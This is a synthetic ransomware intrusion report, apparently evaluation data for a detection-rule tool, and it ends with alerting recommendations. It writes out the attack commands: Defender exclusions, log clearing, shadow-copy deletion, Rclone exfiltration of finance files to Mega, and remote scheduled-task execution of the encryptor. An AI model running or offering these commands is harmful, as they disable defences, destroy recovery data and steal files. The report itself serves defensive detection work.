# Intrusion analysis: RDP brute force to "Kestrel" ransomware deployment in 31 hours

> Synthetic report written for RuleSmith's offline demo and evaluation set. The tradecraft mirrors widely published incident write-ups of ransomware affiliates; names, hashes and infrastructure are fictional.

## Overview

An affiliate operating the Kestrel ransomware-as-a-service compromised a logistics company through an internet-exposed Remote Desktop server, established remote access with AnyDesk, disabled defences, deleted recovery points, exfiltrated data with Rclone and deployed the encryptor to 140 hosts using a scheduled task. The whole intrusion took 31 hours.

## Initial access: RDP password spraying

The perimeter RDP host `RDS-01` recorded over 9,000 failed logons (Windows Security event 4625, LogonType 10) from 185.220.101.0/24 across six hours, followed by a successful logon (event 4624, LogonType 10) for the account `svc_scanner`, whose password was `Summer2025!`. The source IP was 185.220.101.66. The account was a member of the local Administrators group on the RDS host.

## Remote access tooling

Twenty minutes after logon the operator downloaded and installed AnyDesk silently:

```
msiexec.exe /i C:\Users\svc_scanner\AppData\Local\Temp\AnyDesk.msi /qn
"C:\Program Files (x86)\AnyDesk\AnyDesk.exe" --install "C:\ProgramData\AnyDesk" --start-with-win --silent
"C:\Program Files (x86)\AnyDesk\AnyDesk.exe" --set-password
```

The `--set-password` invocation configured unattended access. AnyDesk was not an approved remote-access tool in this environment; the only sanctioned tool was the corporate VPN plus RDP.

## Defence evasion

Before deploying tooling the operator excluded their working directories from Microsoft Defender using PowerShell:

```
powershell.exe -Command "Add-MpPreference -ExclusionPath 'C:\PerfLogs' ; Add-MpPreference -ExclusionPath 'C:\ProgramData\AnyDesk' ; Set-MpPreference -DisableRealtimeMonitoring $true"
```

Event 5007 from the Windows Defender operational log recorded the configuration change. The operator also cleared the Security event log with `wevtutil cl Security` on `RDS-01` shortly before encryption.

## Credential access and lateral movement

A renamed copy of Mimikatz (`C:\PerfLogs\mm.exe`) was executed to dump cached credentials, after which the operator moved laterally with RDP using the domain administrator account `adm-jpark`. We also observed `net use \\FS-02\C$ /user:CORP\adm-jpark` from the RDS host.

## Inhibit system recovery

On each server the operator deleted volume shadow copies and disabled Windows recovery before encryption, running from `cmd.exe` spawned by the AnyDesk session:

```
vssadmin.exe delete shadows /all /quiet
wmic.exe shadowcopy delete
bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
bcdedit.exe /set {default} recoveryenabled no
wbadmin.exe delete catalog -quiet
```

## Exfiltration

Approximately 310 GB of file-share data was exfiltrated to Mega using Rclone, which was renamed to `svchost.exe` and placed in `C:\PerfLogs\`:

```
C:\PerfLogs\svchost.exe copy "\\FS-02\Finance" mega:backup/fin --transfers 16 --config C:\PerfLogs\rc.conf --ignore-existing
```

Note the mismatch between the process name and its `OriginalFileName` (`rclone.exe`), and the fact that the real `svchost.exe` never runs from `C:\PerfLogs`. Network telemetry showed sustained TLS sessions from this process to `*.mega.co.nz` on TCP/443 totalling 310 GB.

## Deployment and encryption

The encryptor `C:\PerfLogs\kstrl.exe` was staged on every host via SMB admin shares and executed through a scheduled task created remotely:

```
schtasks.exe /s FS-02 /create /tn "WindowsUpdateHealth" /tr "C:\PerfLogs\kstrl.exe -path C:\ -no-net" /sc onstart /ru SYSTEM /f
schtasks.exe /s FS-02 /run /tn "WindowsUpdateHealth"
```

Encrypted files received the `.kstrl` extension and the note `HOW_TO_RESTORE.txt` was written to every directory. Before encryption, the binary stopped backup and database services with `net stop` commands for `MSSQLSERVER`, `VeeamBackupSvc` and `SQLWriter`.

## Indicators

| Type | Value |
|---|---|
| SHA256 (kstrl.exe) | 9e8d7c6b5a4f3e2d1c0b9a8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a0f9e8d |
| SHA256 (renamed rclone) | 0f1e2d3c4b5a69788796a5b4c3d2e1f00f1e2d3c4b5a69788796a5b4c3d2e1f0 |
| IP | 185.220.101.66 |
| Mega account | kstrl-backup-01 |

## Recommendations

Alert on bulk 4625 followed by 4624 LogonType 10 from the same source, on AnyDesk installs outside software management, on Defender exclusions added from the command line, on shadow-copy deletion and `bcdedit` recovery changes, on binaries whose OriginalFileName is `rclone.exe` regardless of the file name, and on scheduled tasks created with `/s` against remote hosts running executables from `C:\PerfLogs`.
